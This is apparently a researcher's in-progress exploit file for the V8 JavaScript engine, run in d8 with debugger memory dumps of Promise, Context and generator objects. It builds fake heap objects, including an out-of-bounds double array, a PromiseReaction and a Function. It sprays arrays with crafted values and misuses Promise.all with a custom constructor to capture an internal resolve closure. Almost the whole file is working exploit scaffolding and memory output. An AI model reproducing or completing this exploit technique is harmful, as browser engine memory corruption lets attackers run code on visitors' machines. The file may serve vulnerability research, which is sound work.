function ftoi(val) {
  var buf = new ArrayBuffer(8);
  var f64_buf = new Float64Array(buf);
  var u64_buf = new Uint32Array(buf);

  f64_buf[0] = val;
  return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
  var buf = new ArrayBuffer(8);
  var f64_buf = new Float64Array(buf);
  var u64_buf = new Uint32Array(buf);

  u64_buf[0] = Number(val & 0xffffffffn);
  u64_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}

function itoh(value) {
  return value.toString(16);
}

//gef➤  job 0x1a3e0024dbc9
//0x1a3e0024dbc9: [Context]
// - map: 0x1a3e00151895 <Map(FUNCTION_CONTEXT_TYPE)>
// - type: FUNCTION_CONTEXT_TYPE
// - scope_info: 0x1a3e00000f61 <ScopeInfo>
// - previous: 0x1a3e00000251 <undefined>
// - native_context: 0x1a3e00143c0d <NativeContext[280]>
// - length: 5
// - elements:
//           0: 0x1a3e00000f61 <ScopeInfo>
//           1: 0x1a3e00000251 <undefined>
//           2: 0
//           3: 0x1a3e0024da7d <PromiseCapability>
//           4: 0x1a3e00000219 <FixedArray[0]>
//gef➤  job 0x1a3e00143c0d
//0x1a3e00143c0d: [NativeContext] in OldSpace
// - map: 0x1a3e00143be5 <Map(NATIVE_CONTEXT_TYPE)>
// - type: NATIVE_CONTEXT_TYPE
// - scope_info: 0x1a3e00006285 <ScopeInfo SCRIPT_SCOPE>
// - previous: 0
// - native_context: 0x1a3e00143c0d <NativeContext[280]>
// - extension: 0x1a3e001541b5 <JSGlobalObject>
// - length: 280
// - elements:
//           0: 0x1a3e00006285 <ScopeInfo SCRIPT_SCOPE>
//           1: 0
//           2: 0x1a3e001541b5 <JSGlobalObject>
//           3: 0x1a3e00143bd5 <JSGlobalProxy>
//           4: 0x1a3e0024c309 <Other heap object (EMBEDDER_DATA_ARRAY_TYPE)>
//           5: 0x1a3e00000251 <undefined>
//           6: 0x1a3e0014ee95 <JSFunction next (sfi = 0x1a3e00454251)>
//           7: 0x1a3e0014eeb1 <JSFunction next (sfi = 0x1a3e0045427d)>
//           8: 0x1a3e0014c6e1 <JSFunction apply (sfi = 0x1a3e00459d11)>
//
//gef➤  job 0x1a3e0024da7d
//0x1a3e0024da7d: [PromiseCapability]
// - map: 0x1a3e0000137d <Map[16](PROMISE_CAPABILITY_TYPE)>
// - promise: 0x1a3e0024db45 <Constructor map = 0x1a3e0015c195>
// - resolve: 0x1a3e0024db79 <JSFunction (sfi = 0x1a3e0015c0a1)>
// - reject: 0x1a3e0024db95 <JSFunction (sfi = 0x1a3e0015c0dd)>
//gef➤  job 0x1a3e00143bd5
//0x1a3e00143bd5: [JSGlobalProxy] in OldSpace
// - map: 0x1a3e001583fd <Map[16](HOLEY_ELEMENTS)> [FastProperties]
// - prototype: 0x1a3e001541b5 <JSGlobalObject>
// - elements: 0x1a3e00000219 <FixedArray[0]> [HOLEY_ELEMENTS]
// - hash: 785027
// - native context: 0x1a3e00143c0d <NativeContext[280]>
// - properties:
// - All own properties (excluding elements): {}
//
//gef➤  x/16xg 0x1a3e0024da7d-1
//0x1a3e0024da7c: 0x0024db450000137d      0x0024db950024db79 // promise: 0x0024db45
//0x1a3e0024da8c: 0x0000000600151895      0x0000025100000f61
//0x1a3e0024da9c: 0x001443bd0024da7d      0x0000021900000219
//0x1a3e0024daac: 0x002b4ff500054500      0x001021c10024da8d
//0x1a3e0024dabc: 0x0024daf50015c205      0x0000000000000219
//0x1a3e0024dacc: 0x0000000000000000      0x0000012900000000
//0x1a3e0024dadc: 0x0000000000010001      0x0000612100000279
//0x1a3e0024daec: 0x0015beaf00000194      0x0000002400000c4d
//gef➤  x/16xg 0x1a3e00143bd5-1
//0x1a3e00143bd4: 0x0017f506001583fd      0x00143c0d00000219 // hash: 0x0017f506 >> 1 = 785027
//0x1a3e00143be4: 0x3300000000000061      0x084003ff0d0000d4
//0x1a3e00143bf4: 0x00143c0d00000235      0x0000022900000285
//0x1a3e00143c04: 0x0000000000000000      0x0000023000143be5
//0x1a3e00143c14: 0x0000000000006285      0x00143bd5001541b5
//0x1a3e00143c24: 0x000002510024c309      0x0014eeb10014ee95
//0x1a3e00143c34: 0x0014c5910014c6e1      0x0014440d0014b6ad
//0x1a3e00143c44: 0x00145d2900145bbd      0x0014c3650014adb9
//
//gef➤  job 0x2a6a00250781
//0x2a6a00250781: [Context]
// - map: 0x2a6a00151895 <Map(FUNCTION_CONTEXT_TYPE)>
// - type: FUNCTION_CONTEXT_TYPE
// - scope_info: 0x2a6a00000f61 <ScopeInfo>
// - previous: 0x2a6a00000251 <undefined>
// - native_context: 0x2a6a00143c0d <NativeContext[280]>
// - length: 5
// - elements:
//           0: 0x2a6a00000f61 <ScopeInfo>
//           1: 0x2a6a00000251 <undefined>
//           2: 1
//           3: 0x2a6a00250635 <PromiseCapability>
//           4: 0x2a6a002507e1 <FixedArray[1]>
//gef➤  job 0x2a6a00250635
//0x2a6a00250635: [PromiseCapability]
// - map: 0x2a6a0000137d <Map[16](PROMISE_CAPABILITY_TYPE)>
// - promise: 0x2a6a002506fd <Constructor map = 0x2a6a0015c645>
// - resolve: 0x2a6a00250731 <JSFunction (sfi = 0x2a6a0015c551)>
// - reject: 0x2a6a0025074d <JSFunction (sfi = 0x2a6a0015c58d)>
//gef➤  job 0x2a6a002506fd
//0x2a6a002506fd: [JS_OBJECT_TYPE]
// - map: 0x2a6a0015c645 <Map[52](HOLEY_ELEMENTS)> [FastProperties]
// - prototype: 0x2a6a00250675 <Object map = 0x2a6a0015c6b5>
// - elements: 0x2a6a00000219 <FixedArray[0]> [HOLEY_ELEMENTS]
// - properties: 0x2a6a00000219 <FixedArray[0]>
// - All own properties (excluding elements): {}
//gef➤  x/32xg 0x2a6a002506fd-1
//0x2a6a002506fc: 0x000002190015c645      0x00000b0d00000219
//0x2a6a0025070c: 0x00000b0d00000b0d      0x00000b0d00000b0d
//0x2a6a0025071c: 0x00000b0d00000b0d      0x00000b0d00000b0d
//0x2a6a0025072c: 0x001443bd00000b0d      0x0000021900000219
//0x2a6a0025073c: 0x0015c55100041800      0x0015c62d0015bff9
//0x2a6a0025074c: 0x00000219001443bd      0x0004180000000219
//0x2a6a0025075c: 0x0015bff90015c58d      0x001512350015c639
//0x2a6a0025076c: 0x0000021900000219      0x00000fc100250625
//0x2a6a0025077c: 0x0015189500000002      0x00000f610000000a
//0x2a6a0025078c: 0x0000000200000251      0x002507e100250635
//0x2a6a0025079c: 0x0000021900151749      0x002504cd00000219
//0x2a6a002507ac: 0x001443bd00000df9      0x0000021900000002
//0x2a6a002507bc: 0x002b50d100054600      0x001021c100250781
//0x2a6a002507cc: 0x0000021900151749      0x0000025100000219
//0x2a6a002507dc: 0x0000008900000ddd      0x0000026d00000002
//0x2a6a002507ec: 0x000002190014b5a9      0x002506fd00000219
//gef➤
//
//DebugPrint: 0x226d00253d01: [JSPromise]
// - map: 0x226d0014b5a9 <Map[20](HOLEY_ELEMENTS)> [FastProperties]
// - prototype: 0x226d0014b661 <Object map = 0x226d0014b5d1>
// - elements: 0x226d00000219 <FixedArray[0]> [HOLEY_ELEMENTS]
// - status: pending
// - reactions: 0x226d00253de5 <PromiseReaction>
// - has_handler: 1
// - handled_hint: 0
// - is_silent: 0
// - properties: 0x226d00000219 <FixedArray[0]>
// - All own properties (excluding elements): {}
//0x226d0014b5a9: [Map] in OldSpace
// - type: JS_PROMISE_TYPE
// - instance size: 20
// - inobject properties: 0
// - unused property fields: 0
// - elements kind: HOLEY_ELEMENTS
// - enum length: invalid
// - stable_map
// - back pointer: 0x226d00000251 <undefined>
// - prototype_validity cell: 0x226d00000add <Cell value= 1>
// - instance descriptors (own) #0: 0x226d00000285 <DescriptorArray[0]>
// - prototype: 0x226d0014b661 <Object map = 0x226d0014b5d1>
// - constructor: 0x226d0014b4b5 <JSFunction Promise (sfi = 0x226d00456719)>
// - dependent code: 0x226d00000229 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
// - construction counter: 0
//
//gef➤  job 0x226d00253d01
//0x226d00253d01: [JSPromise]
// - map: 0x226d0014b5a9 <Map[20](HOLEY_ELEMENTS)> [FastProperties]
// - prototype: 0x226d0014b661 <Object map = 0x226d0014b5d1>
// - elements: 0x226d00000219 <FixedArray[0]> [HOLEY_ELEMENTS]
// - status: pending
// - reactions: 0x226d00253de5 <PromiseReaction>
// - has_handler: 1
// - handled_hint: 0
// - is_silent: 0
// - properties: 0x226d00000219 <FixedArray[0]>
// - All own properties (excluding elements): {}
//gef➤  x/16xw 0x226d00253d01-1
//0x226d00253d00: 0x0014b5a9      0x00000219      0x00000219      0x00253de5
//0x226d00253d10: 0x00000008      0x00151895      0x0000000a      0x00000f61
//0x226d00253d20: 0x00000251      0x00253d01      0x00000df9      0x00000ddd
//0x226d00253d30: 0x001443bd      0x00000219      0x00000219      0x00054440
//gef➤
//
//gef➤  job 0x226d00253de5
//0x226d00253de5: [PromiseReaction]
// - map: 0x226d000013cd <Map[24](PROMISE_REACTION_TYPE)>
// - next: 0
// - reject_handler: 0x226d00253dc9 <JSFunction (sfi = 0x226d002b4e11)>
// - fulfill_handler: 0x226d00253dad <JSFunction (sfi = 0x226d002b4e3d)>
// - promise_or_capability: 0x226d00000251 <undefined>
// - continuation_preserved_embedder_data: 0x226d00000251 <undefined>
//gef➤
//
//gef➤  x/16xw 0x226d00253de5-1
//0x226d00253de4: 0x000013cd      0x00000000      0x00253dc9      0x00253dad
//0x226d00253df4: 0x00000251      0x00000251      0xbeadbeef      0xbeadbeef
//0x226d00253e04: 0xbeadbeef      0xbeadbeef      0xbeadbeef      0xbeadbeef
//0x226d00253e14: 0xbeadbeef      0xbeadbeef      0xbeadbeef      0xbeadbeef
//gef➤
//
//gef➤  job 0x226d00253dad
//0x226d00253dad: [Function]
// - map: 0x226d001443bd <Map[28](HOLEY_ELEMENTS)> [FastProperties]
// - prototype: 0x226d00144271 <JSFunction (sfi = 0x226d00108e8d)>
// - elements: 0x226d00000219 <FixedArray[0]> [HOLEY_ELEMENTS]
// - function prototype: <no-prototype-slot>
// - shared_info: 0x226d002b4e3d <SharedFunctionInfo>
// - name: 0x226d00000e25 <String[0]: #>
// - builtin: AsyncFunctionAwaitResolveClosure
// - formal_parameter_count: 1
// - kind: NormalFunction
// - context: 0x226d00253d99 <AwaitContext generator= 0x226d00253cb9 <JSAsyncFunctionObject>>
// - code: 0x226d002b8b19 <Code BUILTIN AsyncFunctionAwaitResolveClosure>
// - properties: 0x226d00000219 <FixedArray[0]>
// - All own properties (excluding elements): {
//    0x226d00000e31: [String] in ReadOnlySpace: #length: 0x226d002b52d9 <AccessorInfo name= 0x226d00000e31 <String[6]: #length>, data= 0x226d00000251 <undefined>> (const accessor descriptor), location: descriptor
//    0x226d00000e5d: [String] in ReadOnlySpace: #name: 0x226d002b52c1 <AccessorInfo name= 0x226d00000e5d <String[4]: #name>, data= 0x226d00000251 <undefined>> (const accessor descriptor), location: descriptor
// }
// - feedback vector: feedback metadata is not available in SFI
//gef➤
//
//gef➤  x/16xw 0x226d00253dad-1
//0x226d00253dac: 0x001443bd      0x00000219      0x00000219      0x00043c80
//0x226d00253dbc: 0x002b4e3d      0x00253d99      0x001021c1      0x001443bd
//0x226d00253dcc: 0x00000219      0x00000219      0x00043c40      0x002b4e11
//0x226d00253ddc: 0x00253d99      0x001021c1      0x000013cd      0x00000000
//gef➤
//
//gef➤  job 0x226d00253d99
//0x226d00253d99: [Context]
// - map: 0x226d00151935 <Map(AWAIT_CONTEXT_TYPE)>
// - type: AWAIT_CONTEXT_TYPE
// - scope_info: 0x226d00006285 <ScopeInfo SCRIPT_SCOPE>
// - previous: 0x226d00143c0d <NativeContext[280]>
// - native_context: 0x226d00143c0d <NativeContext[280]>
// - extension: 0x226d00253cb9 <JSAsyncFunctionObject>
// - length: 3
// - elements:
//           0: 0x226d00006285 <ScopeInfo SCRIPT_SCOPE>
//           1: 0x226d00143c0d <NativeContext[280]>
//           2: 0x226d00253cb9 <JSAsyncFunctionObject>
//gef➤  x/32xw 0x226d00253d99-1
//0x226d00253d98: 0x00151935      0x00000006      0x00006285      0x00143c0d
//0x226d00253da8: 0x00253cb9      0x001443bd      0x00000219      0x00000219
//0x226d00253db8: 0x00043c80      0x002b4e3d      0x00253d99      0x001021c1
//0x226d00253dc8: 0x001443bd      0x00000219      0x00000219      0x00043c40
//0x226d00253dd8: 0x002b4e11      0x00253d99      0x001021c1      0x000013cd
//0x226d00253de8: 0x00000000      0x00253dc9      0x00253dad      0x00000251
//0x226d00253df8: 0x00000251      0xbeadbeef      0xbeadbeef      0xbeadbeef
//0x226d00253e08: 0xbeadbeef      0xbeadbeef      0xbeadbeef      0xbeadbeef
//gef➤
//
//
//gef➤  job 0x226d00253cb9
//0x226d00253cb9: [JSGeneratorObject]
// - map: 0x226d0014f3f9 <Map[44](HOLEY_ELEMENTS)> [FastProperties]
// - prototype: 0x226d00000235 <null>
// - elements: 0x226d00000219 <FixedArray[0]> [HOLEY_ELEMENTS]
// - function: 0x226d0015c7bd <JSFunction example (sfi = 0x226d0015bbe5)>
// - context: 0x226d0015c6f5 <ScriptContext[9]>
// - receiver: 0x226d00143bd5 <JSGlobalProxy>
// - debug pos: 101
// - resume mode: .next()
// - continuation: 0 (suspended)
// - source position: unavailable)
// - register file: 0x226d00253c6d <FixedArray[12]>
// - properties: 0x226d00000219 <FixedArray[0]>
// - All own properties (excluding elements): {}
//gef➤  x/16xw 0x226d00253cb9-1
//0x226d00253cb8: 0x0014f3f9      0x00000219      0x00000219      0x0015c7bd
//0x226d00253cc8: 0x0015c6f5      0x00143bd5      0x000000ca      0x00000000
//0x226d00253cd8: 0x00000000      0x00253c6d      0x00253ca5      0x001443bd
//0x226d00253ce8: 0x00000219      0x00000219      0x00041240      0x0015cbbd
//gef➤
//
//gef➤  job 0x123700256d5d
//0x123700256d5d: [JSGeneratorObject]
// - map: 0x12370014f3f9 <Map[44](HOLEY_ELEMENTS)> [FastProperties]
// - prototype: 0x123700000235 <null>
// - elements: 0x123700000219 <FixedArray[0]> [HOLEY_ELEMENTS]
// - function: 0x12370015c895 <JSFunction example (sfi = 0x12370015bbf5)>
// - context: 0x12370015c7cd <ScriptContext[9]>
// - receiver: 0x123700143bd5 <JSGlobalProxy>
// - debug pos: 84
// - resume mode: .next()
// - continuation: 0 (suspended)
// - source position: unavailable)
// - register file: 0x123700256d11 <FixedArray[12]>
// - properties: 0x123700000219 <FixedArray[0]>
// - All own properties (excluding elements): {}
//gef➤
//
//gef➤  x/32xw 0x123700256d5d-1
//0x123700256d5c: 0x0014f3f9      0x00000219      0x00000219      0x0015c895
//0x123700256d6c: 0x0015c7cd      0x00143bd5      0x000000a8      0x00000000
//0x123700256d7c: 0x00000000      0x00256d11      0x00256d49      0x001443bd
//0x123700256d8c: 0x00000219      0x00000219      0x00041240      0x0015cc75
//0x123700256d9c: 0x0015c7cd      0x0015cd91      0x0014b5a9      0x00000219
//0x123700256dac: 0x00000219      0x00256e89      0x00000008      0x00151895
//0x123700256dbc: 0x0000000a      0x00000f61      0x00000251      0x00256da5
//0x123700256dcc: 0x00000df9      0x00000ddd      0x001443bd      0x00000219
//
//
//d8> %DebugPrint(promise)
//DebugPrint: 0x226d002ec465: [JSArray]
// - map: 0x226d0014ed75 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
// - prototype: 0x226d0014e795 <JSArray[0]>
// - elements: 0x226d002ec485 <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
// - length: 4
// - properties: 0x226d00000219 <FixedArray[0]>
// - All own properties (excluding elements): {
//    0x226d00000e31: [String] in ReadOnlySpace: #length: 0x226d002b5249 <AccessorInfo name= 0x226d00000e31 <String[6]: #length>, data= 0x226d00000251 <undefined>> (const accessor descriptor), location: descriptor
// }
// - elements: 0x226d002ec485 <FixedDoubleArray[4]> {
//           0: 2.91715e-309
//           1: 1.5368e-308
//         2-3: 1.5368e-308
// }
//
//gef➤  x/16xg 0x226d002ec465-1
//0x226d002ec464: 0x000002190014ed75      0x00000008002ec485
//0x226d002ec474: 0x000002190014ed75      0x0000600400302129
//0x226d002ec484: 0x0000000800000925      0x0002190015cb5500
//0x226d002ec494: 0x000b0d0000021900      0x000b0d00000b0d00
//0x226d002ec4a4: 0x000b0d00000b0d00      0x0000002000000925
//0x226d002ec4b4: 0x0019048500000219      0x002e313d42424242
//0x226d002ec4c4: 0x000013cd00000000      0x00000251002e31e1
//0x226d002ec4d4: 0x0000025100000251      0x0018466500000219
//gef➤

const sloppy_func_addr = 0x0025645dn;
const fake_objs_elems_addr = 0x0025753dn;
const oob_arr_draft_elem_addr = 0x0025753dn; // TODO: change this to the suitable location

const sloppy_func = () => {};

const fake_objs = new Array(
  /* +0x08 */ itof(0x000002190014ed75n), // OOB PACKED_DOUBLE_ELEMENTS Array
  /* +0x10 */ itof((0x42424242n << 32n) | oob_arr_draft_elem_addr),
  /* +0x18 */ itof(0x00000000000013cdn), // PromiseReaction
  /* +0x20 */ itof(((fake_objs_elems_addr + 0x30n) << 32n) | 0x00000251n),
  /* +0x28 */ itof(0x0000025100000251n),
  /* +0x30 */ itof(0x00000219001443bdn), // Function
  /* +0x38 */ itof(0x00043c8000000219n),
  /* +0x40 */ itof(((fake_objs_elems_addr + 0x48n) << 32n) | 0x002b4e3dn), // shared_info
  /* +0x48 */ itof(0x0000000600151935n), // Context
  /* +0x50 */ itof(0x0000021900006285n),
  /* +0x58 */ itof(0x0000021900000000n | (fake_objs_elems_addr + 0x60n)),
  /* +0x60 */ itof(0x000002190014f3f9n), // JSGeneratorObject
  /* +0x68 */ itof((sloppy_func_addr << 32n) | 0x00000219n),
  /* +0x70 */ itof(((fake_objs_elems_addr + 0x8n) << 32n) | 0x0015c5b5n), // context: addr <ScriptContext[8]>
  /* +0x78 */ itof(0x00000000000000a8n),
  /* +0x80 */ itof(0x0000021900000000n)
);

//let a;
//
//async function example() {
//  a = new Promise((resolve) => setTimeout(() => resolve("Resolved!"), 1000));
//  let result = await a;
//}
//
//example();
//
//%DebugPrint(a);
//%SystemBreak();

var promise = [
  itof(0x000002190014b5a9n << 8n),
  itof((((fake_objs_elems_addr + 0x18n) << 32n) | 0x00000219n) << 8n),
  itof(0x0000000000000000n << 8n),
];

var arr1 = new Array(1.1, 1.2);
for (let i = 0; i < 0xc00; i++) {
  arr1.push(promise[0]);
  arr1.push(promise[1]);
  arr1.push(promise[2]);
  arr1.push(promise[3]);
}
var arr2 = new Array(1.1, 1.2);
for (let i = 0; i < 0xc00; i++) {
  arr2.push(promise[0]);
  arr2.push(promise[1]);
  arr2.push(promise[2]);
  arr2.push(promise[3]);
}
var arr3 = new Array(1.1, 1.2);
for (let i = 0; i < 0x400; i++) {
  arr3.push(promise[0]);
  arr3.push(promise[1]);
  arr3.push(promise[2]);
  arr3.push(promise[3]);
}

var closure;

function Constructor(executor) {
  executor(
    () => {},
    () => {}
  );
}

Constructor.resolve = function (v) {
  return v;
};

let p1 = {
  then(onFul, onRej) {
    closure = onFul;
    closure(1);
  },
};

async function foo() {
  await Promise.all.call(Constructor, [p1]);
  console.log("[+] ====================================");
  %DebugPrint(sloppy_func);
  console.log("[+] ====================================");
  %DebugPrint(fake_objs);
  console.log("[+] ====================================");
  %DebugPrint(promise);
  console.log("[+] ====================================");
  %DebugPrint(closure);
  console.log("[+] ====================================");
  %SystemBreak();
  await bar(1);
}

async function bar(x) {
  await x;
  throw new Error("Let's have a look...");
}

//Error.prepareStackTrace = function (error, frames) {
//  if (frames.length < 3) {
//    console.log("[+] frames.length < 3");
//  } else {
//    console.log("[+] frames.length >= 3");
//
//    //console.log("[+] ==================");
//    //%DebugPrint(frames);
//    //console.log("[+] ==================");
//    //%DebugPrint(frames[2]);
//    //console.log("[+] ==================");
//    //%DebugPrint(frames[2].getThis());
//    //console.log("[+] ==================");
//  }
//};

foo()
  .then(closure)
  .catch((e) => {
    console.log(e.stack);
  });
